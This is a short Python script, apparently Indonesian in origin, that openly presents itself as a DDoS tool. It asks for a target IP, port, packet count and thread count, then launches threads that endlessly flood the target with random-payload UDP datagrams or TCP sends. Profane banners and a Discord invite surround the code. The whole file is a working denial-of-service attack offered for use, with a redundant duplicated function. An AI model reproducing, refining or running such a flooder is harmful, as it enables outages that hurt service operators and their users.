#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("DDoSa atack by Kent")
print("Kalau Mau Pakek Ganteng Dulu")
print("Mau rename? Mikir dek yg buat susah susah")
ip = str(input(" DdosAttack| Ip:"))
port = int(input(" DdosAttack | Port:"))
choice = str(input(" DdosAttack| Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttack| Packets:"))
threads = int(input(" DdosAttack| Threads:"))
def run():
	data = random._urandom(8920)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | XbacotX |")
		except:
			print("[!] | Server down kontol!!! |")

def run2():
	data = random._urandom(5340)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Kent nih Dek!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

def run2():
	data = random._urandom(750)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xalbador nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
